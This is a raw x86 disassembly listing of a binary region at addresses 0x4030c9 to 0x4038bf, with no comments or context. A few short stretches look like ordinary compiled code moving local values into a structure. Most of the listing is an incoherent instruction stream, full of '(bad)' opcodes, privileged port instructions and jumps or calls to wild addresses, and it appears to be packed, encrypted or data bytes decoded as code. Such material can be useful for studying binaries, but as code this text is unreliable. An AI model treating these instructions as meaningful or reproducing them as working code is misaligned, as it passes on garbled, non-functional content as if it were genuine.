  4030c9:	jo     0x4030e8
  4030cb:	push   eax
  4030cc:	outs   dx,BYTE PTR ds:[esi]
  4030cd:	xchg   DWORD PTR [esi+edx*1],edi
  4030d0:	arpl   WORD PTR [ebp+ebx*2+0x24],cx
  4030d4:	lods   al,BYTE PTR ds:[esi]
  4030d5:	sbb    DWORD PTR [ecx],eax
  4030d7:	or     al,0x4
  4030d9:	lods   eax,DWORD PTR ds:[esi]
  4030da:	mov    ch,0x26
  4030dc:	mov    eax,DWORD PTR [eax]
  4030de:	adc    dl,0xba
  4030e1:	inc    ecx
  4030e2:	inc    eax
  4030e3:	cmp    eax,0x5be5f574
  4030e8:	mov    al,ds:0x26c02da4
  4030ed:	cmp    dh,0xde
  4030f0:	pop    es
  4030f1:	hlt    
  4030f2:	adc    bh,BYTE PTR [esi+0x78289410]
  4030f8:	fsubr  DWORD PTR [ebx+eax*4]
  4030fb:	sub    eax,0xa2a06bfb
  403100:	adc    bh,BYTE PTR [ebp+edx*8-0xa]
  403104:	out    0x25,al
  403106:	aaa    
  403107:	sbb    ch,BYTE PTR [esi-0x12]
  40310a:	sti    
  40310b:	pop    edx
  40310c:	xchg   ebx,eax
  40310d:	add    BYTE PTR [ecx-0x22],dh
  403110:	jno    0x403156
  403112:	shl    DWORD PTR [esi+0x7d],0x2b
  403116:	les    edx,FWORD PTR [edx-0x4a1048ba]
  40311c:	add    al,0xff
  40311e:	int3   
  40311f:	or     al,0xa6
  403121:	ja     0x4030f2
  403123:	call   0xc803fecb
  403128:	sbb    al,0x9b
  40312a:	or     bh,BYTE PTR [ecx-0x5978b994]
  403130:	loope  0x4030c6
  403132:	cmp    DWORD PTR [ebp-0x7c620a9a],eax
  403138:	sbb    DWORD PTR ds:0x8b0189e3,0x4d8bdc45
  403142:	clc    
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x42
  40316d:	ins    BYTE PTR es:[edi],dx
  40316e:	push   ds
  40316f:	jecxz  0x4030fa
  403171:	adc    eax,0x7d6f7e7e
  403176:	jle    0x4031f6
  403178:	(bad)  
  403179:	aas    
  40317a:	mov    ecx,0x954a74ae
  40317f:	shl    BYTE PTR [ecx+0x7aba3e4b],cl
  403185:	xor    BYTE PTR [edi-0x5a8844b4],ah
  40318b:	out    0xef,eax
  40318d:	gs enter 0x120b,0xb7
  403192:	(bad)  
  403194:	std    
  403195:	inc    si
  403197:	push   esi
  403198:	fild   QWORD PTR [esp+ebp*8]
  40319b:	mov    cl,0x7e
  40319d:	aaa    
  40319e:	xor    eax,0x8293b337
  4031a3:	adc    cl,BYTE PTR [ecx+0x41a38e3a]
  4031a9:	stc    
  4031aa:	js     0x403211
  4031ac:	ja     0x40317c
  4031ae:	(bad)  
  4031af:	test   DWORD PTR [ebp-0x870dd1d],esi
  4031b5:	rol    DWORD PTR [ecx+0x35],1
  4031b8:	mov    ch,0x7c
  4031ba:	or     BYTE PTR [eax],bl
  4031bc:	dec    ecx
  4031bd:	sub    DWORD PTR [esi],ebp
  4031bf:	outs   dx,DWORD PTR ds:[esi]
  4031c0:	cmove  edi,DWORD PTR ds:0xb4feef3
  4031c7:	icebp  
  4031c8:	xor    BYTE PTR [ebx-0x1c7cd13],0xb1
  4031cf:	adc    edi,DWORD PTR [edi+0x66]
  4031d2:	lahf   
  4031d3:	pop    edi
  4031d4:	inc    esp
  4031d5:	jmp    0x403171
  4031d7:	jp     0x40317c
  4031d9:	add    BYTE PTR [eax],cl
  4031db:	gs (bad) 
  4031dd:	or     eax,0x4ea6342
  4031e2:	ss inc edx
  4031e4:	daa    
  4031e5:	xchg   esp,eax
  4031e6:	repnz sbb ebx,DWORD PTR [ebx+0x7c6b33fa]
  4031ed:	xor    BYTE PTR [eax+0x4a221121],bh
  4031f3:	jg     0x4031c3
  4031f5:	pop    ecx
  4031f6:	add    ch,BYTE PTR [esi+0x15c1a88a]
  4031fc:	jns    0x403208
  4031fe:	in     al,dx
  4031ff:	pop    ecx
  403200:	jmp    0xcad49262
  403205:	cmp    al,0xfb
  403207:	xlat   BYTE PTR ds:[ebx]
  403208:	and    bh,ch
  40320a:	retf   
  40320b:	jne    0x4031b2
  40320d:	or     dh,bl
  40320f:	cmp    eax,0x67d95b12
  403214:	(bad)  
  403215:	cmc    
  403216:	fwait
  403217:	inc    edx
  403218:	dec    esp
  403219:	leave  
  40321a:	out    dx,eax
  40321b:	dec    ecx
  40321c:	sub    bh,BYTE PTR [eax]
  40321e:	outs   dx,BYTE PTR ds:[esi]
  40321f:	pop    ebp
  403220:	cwde   
  403221:	push   0xffffff94
  403223:	push   ebx
  403224:	clc    
  403225:	sahf   
  403226:	sbb    ebx,DWORD PTR [edi]
  403228:	iret   
  403229:	bound  eax,QWORD PTR ds:0x5b3ee2c7
  40322f:	xchg   ebx,eax
  403230:	dec    eax
  403231:	mov    cl,0x93
  403233:	(bad)  
  403235:	sbb    ah,BYTE PTR [ebx]
  403237:	ja     0x4031f0
  403239:	mov    bl,0xae
  40323b:	imul   ebp,DWORD PTR [ebp+0x1671401a],0x12
  403242:	jbe    0x403261
  403244:	jmp    0xc28d:0xeb32880d
  40324b:	cmp    al,BYTE PTR [ecx-0x473477f5]
  403251:	test   BYTE PTR [edi+esi*8+0x4339e69d],0xb7
  403259:	inc    ebx
  40325a:	cli    
  40325b:	lods   eax,DWORD PTR ds:[esi]
  40325c:	cmc    
  40325d:	and    BYTE PTR [ebx+edi*1+0x11f1bfba],cl
  403264:	push   eax
  403265:	cmp    DWORD PTR [esi-0x7e],ecx
  403268:	les    eax,FWORD PTR [ecx-0x7e]
  40326b:	les    eax,FWORD PTR ds:0x8a17d93b
  403271:	xchg   esi,eax
  403272:	icebp  
  403273:	daa    
  403274:	inc    esi
  403275:	sub    BYTE PTR [edx-0xf607ece],ah
  40327b:	sbb    eax,0x35e30c8e
  403280:	dec    esi
  403281:	scas   al,BYTE PTR es:[edi]
  403282:	jb     0x40323b
  403284:	in     al,dx
  403285:	aaa    
  403286:	into   
  403287:	mov    ch,0x77
  403289:	cld    
  40328a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40328b:	adc    al,BYTE PTR [edi+ecx*4-0x70e74896]
  403292:	push   esi
  403293:	or     BYTE PTR [esi-0x362161a0],bh
  403299:	test   BYTE PTR [ebx],bl
  40329b:	dec    ecx
  40329c:	fs ret 0x56f3
  4032a0:	into   
  4032a1:	xor    eax,0x9db9f1cd
  4032a6:	push   ecx
  4032a7:	ret    
  4032a8:	ds sahf 
  4032aa:	jmp    0x4032bc
  4032ac:	stos   DWORD PTR es:[edi],eax
  4032ad:	repnz aad 0xb7
  4032b0:	sub    edi,DWORD PTR [esi]
  4032b2:	in     eax,dx
  4032b3:	aad    0xc6
  4032b5:	inc    edx
  4032b6:	and    ah,BYTE PTR [edi]
  4032b8:	or     al,cl
  4032ba:	pop    ds
  4032bb:	jle    0x403294
  4032bd:	scas   al,BYTE PTR es:[edi]
  4032be:	add    edi,DWORD PTR [edi]
  4032c0:	fnsave [ebp+0x7bbf11aa]
  4032c6:	into   
  4032c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032c8:	cmp    BYTE PTR [edx],0xd4
  4032cb:	adc    al,0xae
  4032cd:	das    
  4032ce:	mov    BYTE PTR [esp+ebp*1-0x29],al
  4032d2:	push   es
  4032d3:	mov    esi,0x3ffce35e
  4032d8:	xchg   ebx,eax
  4032d9:	out    dx,al
  4032da:	sub    ch,BYTE PTR [eax-0x2b2da8a4]
  4032e0:	adc    BYTE PTR [eax],0x82
  4032e3:	pop    eax
  4032e4:	xlat   BYTE PTR ds:[ebx]
  4032e5:	and    esi,edi
  4032e7:	imul   ecx,DWORD PTR [ecx],0x18e0e80
  4032ed:	sub    ebx,ecx
  4032ef:	jl     0x403304
  4032f1:	sbb    BYTE PTR [eax-0x39b8faad],cl
  4032f7:	ret    
  4032f8:	jge    0x40328f
  4032fa:	jo     0x403367
  4032fc:	mov    ch,0x2f
  4032fe:	mov    ebp,0x5f11b603
  403303:	pop    edx
  403304:	jns    0x40333b
  403306:	or     BYTE PTR [ecx-0x7abeb23],ch
  40330c:	shl    BYTE PTR [edi-0x30],cl
  40330f:	add    al,0x37
  403311:	fyl2x  
  403313:	push   ebp
  403314:	sbb    edi,DWORD PTR [edx-0x27accced]
  40331a:	jg     0x4032ae
  40331c:	xor    BYTE PTR [edi-0x3f],cl
  40331f:	sti    
  403320:	pop    esp
  403321:	mov    al,0x25
  403323:	cli    
  403324:	jle    0x403398
  403326:	jo     0x4032ef
  403328:	dec    ebp
  403329:	fld    DWORD PTR [ecx]
  40332b:	and    dl,BYTE PTR [edi-0x5975db43]
  403331:	stc    
  403332:	sar    BYTE PTR [eax-0x12],1
  403335:	sub    eax,0x5a1f4ec
  40333a:	mov    al,BYTE PTR [ebx-0x26]
  40333d:	mov    al,ds:0xe6fdeeed
  403342:	sub    al,0xf3
  403344:	push   0xfffffff5
  403346:	sub    DWORD PTR [ebx],ebx
  403348:	xchg   edx,eax
  403349:	adc    BYTE PTR [eax],0x45
  40334c:	inc    ecx
  40334d:	cli    
  40334e:	mov    esp,0x37aaa131
  403353:	jmp    0x8622:0x736d4ca8
  40335a:	outs   dx,BYTE PTR ds:[esi]
  40335b:	xchg   dh,ch
  40335d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40335e:	ins    DWORD PTR es:[edi],dx
  40335f:	adc    ecx,DWORD PTR [edx+0x524ce394]
  403365:	fild   QWORD PTR [edi+0x30]
  403368:	jb     0x403397
  40336a:	or     edi,eax
  40336c:	fstp   TBYTE PTR [ebx]
  40336e:	xor    ecx,ebp
  403370:	fistp  WORD PTR [edx]
  403372:	and    eax,0xffad907
  403377:	sbb    al,0xb0
  403379:	mov    eax,ds:0x1587f5ff
  40337e:	push   eax
  40337f:	sub    DWORD PTR [ebx-0x140379eb],edx
  403385:	inc    esi
  403386:	pop    esp
  403387:	pop    esp
  403388:	adc    al,0x5b
  40338a:	adc    BYTE PTR [edi+edi*4-0x276cb34c],bl
  403391:	mov    ebp,0x5f437ec3
  403396:	add    eax,0xb5aa4992
  40339b:	add    BYTE PTR [ecx-0x4],dh
  40339e:	or     eax,0x46dc7285
  4033a3:	jmp    0x3c04:0x648b9c95
  4033aa:	(bad)  
  4033ab:	xchg   edi,eax
  4033ac:	fbstp  TBYTE PTR [eax]
  4033ae:	cli    
  4033af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033b0:	out    dx,al
  4033b1:	dec    ebx
  4033b2:	push   esp
  4033b3:	out    0x90,al
  4033b5:	call   0xccdf:0x2cd9b623
  4033bc:	add    eax,0xb3634209
  4033c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033c2:	cmc    
  4033c3:	sub    BYTE PTR [ecx],0xb0
  4033c6:	cmp    eax,0xb0df5e51
  4033cb:	jns    0x40342c
  4033cd:	mov    dh,0x44
  4033cf:	jb     0x4033e7
  4033d1:	in     eax,dx
  4033d2:	lahf   
  4033d3:	mov    ds:0xaf2bbb8c,eax
  4033d8:	push   eax
  4033d9:	mov    ebx,0x980aaee9
  4033de:	mov    al,0x56
  4033e0:	sar    BYTE PTR [eax+0x6013c0b1],1
  4033e6:	push   eax
  4033e7:	test   eax,0xcd8e7114
  4033ec:	mov    ds:0xd8dbae4b,eax
  4033f1:	pop    esi
  4033f2:	or     DWORD PTR [ebp+0x610da7d8],ebp
  4033f8:	pusha  
  4033f9:	xor    dh,BYTE PTR ds:0x5eb9aa48
  4033ff:	sub    ah,BYTE PTR [esi]
  403401:	jl     0x4033f1
  403403:	xchg   ecx,eax
  403404:	xor    dh,BYTE PTR [eax-0x4acfe5ad]
  40340a:	lahf   
  40340b:	mov    edx,0x6025964f
  403410:	jnp    0x403451
  403412:	jno    0x403473
  403414:	jp     0x403398
  403416:	je     0x4033fc
  403418:	inc    ebp
  403419:	fdiv   DWORD PTR [ecx+0x17]
  40341c:	push   ecx
  40341d:	cmp    sp,WORD PTR [eax]
  403420:	repz jbe 0x4033bc
  403423:	(bad)  [ecx-0x52]
  403426:	adc    al,0xa4
  403428:	pop    ebp
  403429:	sub    esp,DWORD PTR [esi+0x38f2256c]
  40342f:	enter  0x2a2c,0x4e
  403433:	dec    edi
  403434:	mov    dh,0x36
  403436:	dec    ebp
  403437:	test   BYTE PTR [ebx-0x4b430fb9],ch
  40343d:	js     0x403431
  40343f:	repnz and DWORD PTR [ecx-0x48deccfe],eax
  403446:	mov    esi,DWORD PTR [ecx]
  403448:	mov    gs,WORD PTR [edx+0x38]
  40344b:	scas   al,BYTE PTR es:[edi]
  40344c:	jns    0x4034ad
  40344e:	pop    ds
  40344f:	jl     0x4034b3
  403451:	mov    al,ds:0x55265bc5
  403456:	(bad)  
  403457:	(bad)  
  403458:	cld    
  403459:	lds    ecx,FWORD PTR [eax-0x62]
  40345c:	aaa    
  40345d:	retf   
  40345e:	push   cs
  40345f:	mov    bh,0x84
  403461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403462:	and    al,0x13
  403464:	call   0xb1b264cf
  403469:	fsubr  QWORD PTR [ecx+ebx*2]
  40346c:	adc    dl,BYTE PTR [ebx+edi*8]
  40346f:	(bad)  
  403470:	or     bl,al
  403472:	icebp  
  403473:	jmp    0x51005f95
  403478:	mov    edi,0xbbd97018
  40347d:	bound  eax,QWORD PTR [esi+ebx*8-0x72b706a9]
  403484:	into   
  403485:	repz push edi
  403487:	sbb    eax,0xce092c0c
  40348c:	cmp    eax,0xa097e817
  403491:	pop    es
  403492:	jo     0x40342b
  403494:	cld    
  403495:	sub    al,0xef
  403497:	in     al,dx
  403498:	cmp    al,0xe7
  40349a:	nop
  40349b:	lahf   
  40349c:	pop    eax
  40349d:	mov    cs:0x564c90e2,eax
  4034a3:	int    0x13
  4034a5:	nop
  4034a6:	push   ss
  4034a7:	mov    ds:0x99df9770,al
  4034ac:	pop    ds
  4034ad:	icebp  
  4034ae:	mov    ecx,0x592e33d8
  4034b3:	(bad)  
  4034b4:	inc    ebp
  4034b5:	jbe    0x403484
  4034b7:	jg     0x40344a
  4034b9:	test   eax,0xb5f34252
  4034be:	mov    bl,BYTE PTR [esi]
  4034c0:	or     al,0x9c
  4034c2:	js     0x403521
  4034c4:	xor    BYTE PTR ds:0x7606555e,ch
  4034ca:	das    
  4034cb:	lahf   
  4034cc:	cmp    BYTE PTR [esi+0x21],al
  4034cf:	jmp    0xf61b:0xc63face0
  4034d6:	out    0xf0,al
  4034d8:	inc    edi
  4034d9:	jmp    0xf42a:0x7b680f0f
  4034e0:	jbe    0x40353c
  4034e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034e3:	pushf  
  4034e4:	(bad)  
  4034e5:	pop    ebp
  4034e6:	sbb    BYTE PTR [edi+0x7d],dl
  4034e9:	shl    DWORD PTR [eax+0x64],0xd3
  4034ed:	inc    bh
  4034ef:	inc    ecx
  4034f0:	cmp    dh,cl
  4034f2:	and    DWORD PTR [eax-0x48c04724],ebp
  4034f8:	mov    al,ds:0xa0daca96
  4034fd:	sbb    DWORD PTR [ebx-0x6d],ebx
  403500:	xchg   BYTE PTR [edi-0x2a],bl
  403503:	or     DWORD PTR [edi],0x44f67db3
  403509:	(bad)  
  40350b:	cmp    bh,BYTE PTR [edi-0x2520e42f]
  403511:	test   BYTE PTR [edi-0x7c68058f],0x1c
  403518:	xchg   edi,eax
  403519:	enter  0x3fcd,0x8b
  40351d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40351e:	repnz add BYTE PTR [edi],al
  403521:	dec    ecx
  403522:	inc    eax
  403523:	xchg   edx,eax
  403524:	sbb    eax,0xf0c9fa46
  403529:	retf   
  40352a:	test   eax,0x4d32743b
  40352f:	add    al,0x86
  403531:	xor    edx,DWORD PTR [ebx-0x75c8ba44]
  403537:	lea    ebp,[edx]
  403539:	imul   DWORD PTR [eax-0x1a]
  40353c:	inc    edx
  40353d:	div    BYTE PTR [ebx+0x20]
  403540:	push   esp
  403541:	iret   
  403542:	xchg   edx,eax
  403543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403544:	push   edx
  403545:	push   edx
  403546:	add    DWORD PTR [eax-0x55680e31],ebx
  40354c:	xor    BYTE PTR [edx-0x6710a01c],ch
  403552:	or     BYTE PTR [ebx],dh
  403554:	mov    dl,0x3b
  403556:	and    al,0xb8
  403558:	add    DWORD PTR [ebx+eax*8+0x6b2654a4],ebp
  40355f:	sti    
  403560:	(bad)  
  403561:	mov    esi,0x3aedec9b
  403566:	xor    eax,0x4d8b9227
  40356b:	clc    
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	xchg   ebx,eax
  403598:	fcomp  DWORD PTR [ebp+0x7e1186de]
  40359e:	jle    0x40360f
  4035a0:	jge    0x403620
  4035a2:	jle    0x403620
  4035a4:	lods   al,BYTE PTR gs:[esi]
  4035a6:	(bad)  
  4035a7:	out    dx,eax
  4035a8:	lahf   
  4035a9:	clc    
  4035aa:	mov    ds:0x6197e6a0,eax
  4035af:	adc    ecx,esp
  4035b1:	sbb    esi,DWORD PTR [esi+0x5403c7d7]
  4035b7:	mov    esp,0xdfdb9d05
  4035bc:	jne    0x40353e
  4035be:	sbb    eax,0x357d6726
  4035c3:	jg     0x4035f5
  4035c5:	out    0xb8,eax
  4035c7:	int3   
  4035c8:	mov    ecx,0x7fe1dd37
  4035cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035ce:	stc    
  4035cf:	jne    0x40356c
  4035d1:	inc    edx
  4035d2:	mov    al,0x7f
  4035d4:	mov    esi,0xa4606a42
  4035d9:	sub    DWORD PTR [ebp+eax*1-0x42],ecx
  4035dd:	lods   al,BYTE PTR ds:[esi]
  4035de:	xchg   esp,eax
  4035df:	cmp    esi,ecx
  4035e1:	cmp    DWORD PTR [edi+edx*2-0x3b955398],esi
  4035e8:	inc    edi
  4035e9:	or     al,0x11
  4035eb:	sub    ch,BYTE PTR [edx+0x1b1e1cce]
  4035f1:	cmp    DWORD PTR [esi],edi
  4035f3:	cmp    DWORD PTR [edx+0xf],ebp
  4035f6:	jo     0x4035a6
  4035f8:	inc    edx
  4035f9:	inc    edi
  4035fa:	pop    eax
  4035fb:	dec    eax
  4035fc:	cwde   
  4035fd:	in     eax,0x3a
  4035ff:	lahf   
  403600:	mov    edx,0x2c5ec2b8
  403605:	aas    
  403606:	(bad)  
  403607:	sar    BYTE PTR [esi-0x30abf721],cl
  40360d:	int3   
  40360e:	fisttp WORD PTR [edi]
  403610:	jecxz  0x403644
  403612:	dec    edx
  403613:	jmp    0x40362e
  403615:	fnsave [ecx+esi*8-0x4a08c010]
  40361c:	or     eax,0x5d18a1d4
  403621:	js     0x40363b
  403623:	inc    esp
  403624:	xlat   BYTE PTR ds:[ebx]
  403625:	sub    eax,eax
  403627:	mov    ch,0xb9
  403629:	fs inc esi
  40362b:	sti    
  40362c:	call   0x899e:0x4554c6e5
  403633:	test   al,0xc1
  403635:	loope  0x403684
  403637:	xlat   BYTE PTR ds:[ebx]
  403638:	ror    DWORD PTR [edi+0x61],0x3
  40363c:	outs   dx,BYTE PTR ds:[esi]
  40363d:	les    esp,FWORD PTR [esi]
  40363f:	lock sbb dl,BYTE PTR [edx-0x4ed3c292]
  403646:	test   al,0xe6
  403648:	cld    
  403649:	nop
  40364a:	jge    0x403645
  40364c:	pusha  
  40364d:	and    al,0xfc
  40364f:	fisubr DWORD PTR [edx+0x7e]
  403652:	test   DWORD PTR [ebp+0x6d8dd929],eax
  403658:	jo     0x4035fc
  40365a:	out    0x87,eax
  40365c:	fcomp  st(0)
  40365e:	cmp    eax,0x2ed49017
  403663:	ins    BYTE PTR es:[edi],dx
  403664:	jle    0x403632
  403666:	adc    BYTE PTR [ebp-0x13],0xfd
  40366a:	sbb    eax,0x11ba88e9
  40366f:	lock shl DWORD PTR ds:[ebx],cl
  403673:	loope  0x403626
  403675:	dec    esi
  403676:	loope  0x4036e3
  403678:	nop
  403679:	mov    gs,WORD PTR [edx+eiz*2+0xc]
  40367d:	dec    edi
  40367e:	jge    0x40360e
  403680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403681:	(bad)  
  403682:	es xor ah,ah
  403685:	pop    edi
  403686:	cmp    al,0x93
  403688:	jg     0x4036aa
  40368a:	into   
  40368b:	mov    ds:0xe091baed,al
  403690:	push   cs
  403691:	sub    bh,ah
  403693:	pop    esi
  403694:	sbb    al,dh
  403696:	cmp    DWORD PTR [ecx+0x2673ca73],edx
  40369c:	and    eax,DWORD PTR [esi+edx*1+0x18c6671e]
  4036a3:	pop    ebx
  4036a4:	fwait
  4036a5:	(bad)  
  4036a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036a7:	mov    BYTE PTR [edx],al
  4036a9:	jnp    0x403704
  4036ab:	sub    eax,0xd2412e1d
  4036b0:	sub    edi,DWORD PTR [ebp-0x307de74a]
  4036b6:	test   DWORD PTR [edx-0x12],esp
  4036b9:	addr16 mov edx,0xdc21ba7d
  4036bf:	push   edi
  4036c0:	pop    esi
  4036c1:	fs mov edi,0x4d7c1a00
  4036c7:	mov    ebp,0x95ee30b2
  4036cc:	lods   eax,DWORD PTR ds:[esi]
  4036cd:	in     eax,0x33
  4036cf:	je     0x403711
  4036d1:	aas    
  4036d2:	push   ds
  4036d3:	push   0x64
  4036d5:	je     0x4036e6
  4036d7:	(bad)  
  4036d8:	fdiv   QWORD PTR [ebx+0x150083fd]
  4036de:	xchg   esp,eax
  4036df:	or     eax,0x4c6d3417
  4036e4:	arpl   WORD PTR [eax+0x569750b8],sp
  4036ea:	cmp    DWORD PTR [edx-0x4e],esi
  4036ed:	pop    eax
  4036ee:	ret    
  4036ef:	ds jbe 0x4036de
  4036f2:	adc    al,0x79
  4036f4:	push   ebx
  4036f5:	stos   BYTE PTR es:[edi],al
  4036f6:	pop    ebx
  4036f7:	(bad)  
  4036f8:	xchg   ebp,eax
  4036f9:	and    bh,BYTE PTR [eax]
  4036fb:	icebp  
  4036fc:	mov    ecx,0x22981c00
  403701:	ds scas eax,DWORD PTR es:[edi]
  403703:	mov    es,WORD PTR cs:[edi+ecx*8+0x6b]
  403708:	jb     0x4036fe
  40370a:	jno    0x403715
  40370c:	pushf  
  40370d:	out    0xbe,eax
  40370f:	dec    ebp
  403710:	push   edi
  403711:	pop    ecx
  403712:	jmp    0x3a5e:0xf85d1d35
  403719:	pop    ss
  40371a:	mov    edi,0xe4fff06f
  40371f:	add    al,dl
  403721:	mov    ecx,0x19f59634
  403726:	jge    0x4036f2
  403728:	mov    DWORD PTR [edi-0x5d],eax
  40372b:	cmp    dl,BYTE PTR [esi]
  40372d:	retf   0xec81
  403730:	lock xchg edx,eax
  403732:	test   BYTE PTR [edx],al
  403734:	push   edx
  403735:	pop    esp
  403736:	and    edx,esp
  403738:	xor    esp,esp
  40373a:	lahf   
  40373b:	lock retf 
  40373d:	gs inc esp
  40373f:	rcr    DWORD PTR [eax],0x6
  403742:	inc    ecx
  403743:	jge    0x4037a0
  403745:	je     0x4036f9
  403747:	daa    
  403748:	imul   esi,DWORD PTR [esi-0x72ea8544],0x1e
  40374f:	(bad)  [edx]
  403751:	xlat   BYTE PTR ds:[ebx]
  403752:	lds    esp,FWORD PTR [edi+ecx*4+0x1d82f700]
  403759:	cmc    
  40375a:	ror    BYTE PTR [eax+0x30],1
  40375d:	fcom   DWORD PTR [edx-0x31a4a970]
  403763:	pop    ebx
  403764:	mov    ecx,DWORD PTR [ecx+0x13]
  403767:	dec    edx
  403768:	cli    
  403769:	jne    0x40372f
  40376b:	mov    cl,0xf8
  40376d:	push   ss
  40376e:	fs repnz push ebx
  403771:	call   0x843b12f8
  403776:	xchg   edx,eax
  403777:	add    ecx,DWORD PTR [ebp+0x60]
  40377a:	fbstp  TBYTE PTR [ebx-0x57]
  40377d:	push   cs
  40377e:	lods   al,BYTE PTR ds:[esi]
  40377f:	(bad)
  403782:	mov    ecx,DWORD PTR [eax-0x6255d064]
  403788:	shl    BYTE PTR [esi-0x22d0c879],1
  40378e:	popf   
  40378f:	jmp    0xd77d5cca
  403794:	aaa    
  403795:	mov    dh,0xe2
  403797:	jno    0x403810
  403799:	sbb    BYTE PTR [edx],dl
  40379b:	cmp    dh,ch
  40379d:	mov    ecx,0x70bfcdf8
  4037a2:	test   eax,0x9d7a5ae9
  4037a7:	adc    edi,DWORD PTR [ecx]
  4037a9:	cmp    eax,0x339a3754
  4037ae:	je     0x40381e
  4037b0:	fist   DWORD PTR [ecx+ecx*2]
  4037b3:	mov    ah,0x2b
  4037b5:	inc    esp
  4037b6:	int3   
  4037b7:	aam    0x3d
  4037b9:	jmp    FWORD PTR [ebp-0x6d212119]
  4037bf:	adc    cl,BYTE PTR [edi-0x3337edfe]
  4037c5:	repnz push 0xffffff98
  4037c8:	sar    BYTE PTR [edi+eax*2-0x37],0xb1
  4037cd:	jge    0x403786
  4037cf:	push   0x665651a7
  4037d4:	xlat   BYTE PTR ds:[ebx]
  4037d5:	dec    ecx
  4037d6:	iret   
  4037d7:	cmp    ebx,DWORD PTR ds:0x9f952920
  4037dd:	and    dl,ch
  4037df:	nop
  4037e0:	inc    eax
  4037e1:	int3   
  4037e2:	mov    BYTE PTR [ecx],bl
  4037e4:	dec    ebp
  4037e5:	inc    eax
  4037e6:	xchg   BYTE PTR [edx+edi*4-0x7059ec0d],bl
  4037ed:	sbb    al,0x9e
  4037ef:	mov    eax,ds:0xfedf8018
  4037f4:	push   cs
  4037f5:	les    esi,FWORD PTR [eax+0x9c4fda4]
  4037fb:	retf   
  4037fc:	mov    ecx,0x3ee5fa50
  403801:	xor    cl,al
  403803:	outs   dx,DWORD PTR ds:[esi]
  403804:	sub    BYTE PTR [edi-0x521d57c2],bh
  40380a:	cld    
  40380b:	std    
  40380c:	xchg   esp,eax
  40380d:	std    
  40380e:	pop    ss
  40380f:	(bad)  
  403810:	or     DWORD PTR [esi-0x11],ebx
  403813:	mov    ah,BYTE PTR [ebx]
  403815:	pusha  
  403816:	(bad)  
  403817:	mov    bh,0x16
  403819:	add    eax,0xf8d690d7
  40381e:	jbe    0x40389c
  403820:	popa   
  403821:	sbb    eax,0x28744918
  403826:	popf   
  403827:	adc    edi,DWORD PTR ds:0x153969ae
  40382d:	in     al,dx
  40382e:	push   eax
  40382f:	popa   
  403830:	xrelease xchg DWORD PTR [edx-0x7c],ebx
  403834:	in     eax,dx
  403835:	call   0xef68:0xb9e8688f
  40383c:	mov    ds:0x6043e6ab,al
  403841:	dec    eax
  403842:	mov    BYTE PTR [esi-0x5b],bl
  403845:	dec    ecx
  403846:	mov    ebp,0x60439884
  40384b:	in     eax,dx
  40384c:	and    al,0x13
  40384e:	jo     0x40384f
  403850:	push   esi
  403851:	pop    ds
  403852:	inc    ebp
  403853:	jo     0x40386b
  403855:	gs mov edx,0xff8a44b
  40385b:	test   DWORD PTR [esp+ebx*4+0x57],edx
  40385f:	sar    BYTE PTR [ecx-0x5c2fbe2d],0x76
  403866:	sub    eax,0xf4a93f34
  40386b:	inc    edi
  40386c:	leave  
  40386d:	or     BYTE PTR [esp+esi*2],dh
  403870:	pop    ebp
  403871:	inc    esp
  403872:	push   esp
  403873:	mov    ds,WORD PTR [eax-0x1a1ec63a]
  403879:	(bad)  
  40387a:	push   ebp
  40387b:	lds    ecx,FWORD PTR [ecx+edx*8+0x65]
  40387f:	sub    DWORD PTR ds:0xc7bfd952,ecx
  403885:	sti    
  403886:	icebp  
  403887:	and    DWORD PTR [edx*2-0x1168b3c0],eax
  40388e:	sar    BYTE PTR [edi+0x5055f5e2],cl
  403894:	sub    cl,BYTE PTR [ebx]
  403896:	scas   eax,DWORD PTR es:[edi]
  403897:	jp     0x40390a
  403899:	inc    esi
  40389a:	rol    DWORD PTR [eax],cl
  40389c:	fisttp QWORD PTR [esp+esi*2-0x78]
  4038a0:	and    dl,BYTE PTR [ebp-0xa]
  4038a3:	cmp    ebp,DWORD PTR [edx+0x64]
  4038a6:	dec    DWORD PTR [ecx]
  4038a8:	push   es
  4038a9:	(bad)  
  4038aa:	shr    BYTE PTR [eax+0x3],cl
  4038ad:	xor    DWORD PTR [edx],0x3d
  4038b0:	loopne 0x403898
  4038b2:	out    dx,al
  4038b3:	stc    
  4038b4:	push   ebx
  4038b5:	dec    edx
  4038b6:	xchg   ecx,eax
  4038b7:	mov    dh,0x60
  4038b9:	nop
  4038ba:	xor    eax,0x664be4f7
  4038bf:	shl    BYTE PTR [ebx-0x5b],1
